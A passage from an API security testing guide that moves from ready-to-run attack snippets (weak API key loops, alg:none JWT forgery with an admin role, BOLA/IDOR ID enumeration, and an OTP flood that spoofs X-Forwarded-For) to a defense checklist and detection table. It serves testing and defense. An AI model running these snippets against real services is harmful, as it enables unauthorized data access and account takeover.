# 5. kiterunner endpoint brute force
kr scan https://api.target.com -w ~/wordlists/routes-large.kite

# 6. Postman network request
# Use Postman Interceptor to capture and analyze all API calls
```

---

## 2. Authentication Testing

### API Key Testing

```bash
# Test common API key locations
curl -H "X-API-Key: test" https://api.target.com/v1/users
curl "https://api.target.com/v1/users?api_key=test"
curl -H "Authorization: ApiKey test" https://api.target.com/v1/users

# Check if API key is in JS source
curl https://target.com/app.js | grep -iE "api[-_]?key|apikey"

# Try common/weak API keys
for key in "" "null" "undefined" "test" "demo" "admin"; do
    resp=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "X-API-Key: $key" https://api.target.com/v1/users)
    echo "$key: $resp"
done
```

### JWT Attacks

```python
import jwt
import base64
import json

def test_jwt_attacks(token: str) -> dict:
    """Test common JWT vulnerabilities"""
    
    results = {}
    
    # Decode without verification
    parts = token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # alg:none attack
    header_none = {**header, 'alg': 'none'}
    h_enc = base64.urlsafe_b64encode(json.dumps(header_none).encode()).rstrip(b'=').decode()
    p_enc = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
    results['alg_none_token'] = f"{h_enc}.{p_enc}."
    
    # Modified payload (admin privilege)
    admin_payload = {**payload, 'role': 'admin', 'is_admin': True}
    results['admin_payload'] = admin_payload
    
    return results
```

---

## 3. Authorization Testing

### BOLA/IDOR Testing

```python
import requests

def test_bola_comprehensive(base_url: str, token: str, 
                            endpoint: str, id_range: range) -> list:
    """Comprehensive BOLA test"""
    
    findings = []
    headers = {"Authorization": f"Bearer {token}"}
    
    for obj_id in id_range:
        # Integer ID
        resp = requests.get(f"{base_url}{endpoint}/{obj_id}", headers=headers)
        if resp.status_code == 200:
            findings.append({
                "id": obj_id,
                "type": "integer_idor",
                "url": f"{base_url}{endpoint}/{obj_id}"
            })
        
        # UUID format
        import uuid
        uuid_id = str(uuid.UUID(int=obj_id))
        resp2 = requests.get(f"{base_url}{endpoint}/{uuid_id}", headers=headers)
        if resp2.status_code == 200:
            findings.append({
                "id": uuid_id,
                "type": "uuid_idor"
            })
    
    return findings
```

---

## 4. Rate Limit Testing

```python
import threading
import requests
import time

def test_rate_limit(url: str, auth: str, count: int = 200, workers: int = 20) -> dict:
    """Rate limit bypass test"""
    
    stats = {"success": 0, "limited": 0, "error": 0}
    lock = threading.Lock()
    
    def worker():
        headers = {
            "Authorization": f"Bearer {auth}",
            "X-Forwarded-For": f"10.0.{threading.get_ident() % 256}.1"
        }
        resp = requests.post(url, headers=headers, json={"otp": "123456"})
        with lock:
            if resp.status_code == 200:
                stats["success"] += 1
            elif resp.status_code == 429:
                stats["limited"] += 1
            else:
                stats["error"] += 1
    
    threads = [threading.Thread(target=worker) for _ in range(count)]
    for t in threads: t.start()
    for t in threads: t.join()
    
    if stats["limited"] == 0:
        print("[!] No rate limiting detected!")
    elif stats["success"] > 1:
        print(f"[!] Rate limit bypass possible: {stats['success']} successes")
    
    return stats
```

---

## 5. API Security Defenses

```
Authentication:
  □ Use OAuth 2.0 / OpenID Connect
  □ JWT: short expiry (15 minutes), HS256 or RS256
  □ API key rotation policy
  □ Mutual TLS (mTLS) for service-to-service

Authorization:
  □ Object-level authorization check on every request
  □ RBAC (Role-Based Access Control) implementation
  □ Attribute-based access control for sensitive endpoints
  □ JWT claims validation

Rate Limiting:
  □ Rate limits per endpoint
  □ User-level and IP-level limits
  □ Burst limit configuration
  □ Custom limits per endpoint

Monitoring:
  □ Log all API requests
  □ Alert on abnormal patterns
  □ Maintain API inventory
  □ Remove end-of-life versions
```

<!-- detect-validate-17 -->
## API Attack Detection and Defense Validation

API attacks describe *how to bypass authorization/logic*, but defenders must verify **where each leaves traces (gateway, app logs)** and **whether auth, rate limiting, and schema validation actually block** (complements section 52).

### Attack -> Layer -> Control (defender) -> Detection signal

| Attack (OWASP API) | Targeted layer | Primary control (defender) | Detection signal |
|---|---|---|---|
| BOLA/IDOR (API1) | Object authorization | Object-ownership check | Other users' IDs accessed, 403 spikes |
| Broken auth (API2) | Token validation | Strong JWT validation, MFA | alg:none, expired-ignored tokens |
| Excessive data exposure (API3) | Response schema | Field allowlist | Sensitive fields in response, oversized payloads |
| Resource abuse (API4) | Rate/quota | Rate limit, pagination | Bulk requests, 429 patterns |

### Defense validation (verify directly)

```bash
# Verify auth and rate limiting are actually applied (own API) — 401 and 429 should appear
curl -s -o /dev/null -w 'no-auth: %{http_code}\n' https://api.localhost/v1/users   # expect 401
for i in $(seq 1 120); do curl -s -o /dev/null -w '%{http_code} ' https://api.localhost/v1/ping; done; echo
# A 429 near the end means rate limiting works — all 200 means it is not applied
```

> Validate only on **authorized engagements / owned APIs / controlled environments**. "Configured auth/rate limit" differs from "actually blocks the bypass and alerts" — reproduce BOLA/token PoCs against your own API to confirm blocking/logging ([[52_API_Security]], [[13_SOC_Blue_Team]]).
